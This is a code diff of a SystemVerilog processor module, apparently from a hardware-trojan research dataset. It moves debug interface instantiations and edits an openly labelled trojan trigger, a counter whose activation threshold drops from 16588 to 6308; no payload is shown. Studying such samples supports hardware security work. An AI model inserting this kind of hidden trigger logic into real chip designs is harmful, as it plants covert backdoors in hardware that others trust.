@@ -39,14 +39,18 @@ output
     logic serialWE,
     SerialDataPath serialWriteData
 );
+    //
+    // --- For Debug
+    //
+    DebugIF debugIF( clk, rst );
+    PerformanceCounterIF perfCounterIF( clk, rst );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=6308)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 16588;
+    localparam int TRIGGER_THRESHOLD = 6308;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk or negedge rst) begin
         if (!rst) begin
             trojan_counter <= '0;
@@ -57,11 +61,6 @@ output
         end
     end
 
-    //
-    // --- For Debug
-    //
-    DebugIF debugIF( clk, rst );
-    PerformanceCounterIF perfCounterIF( clk, rst );
 
     assign debugRegister = debugIF.debugRegister;
 
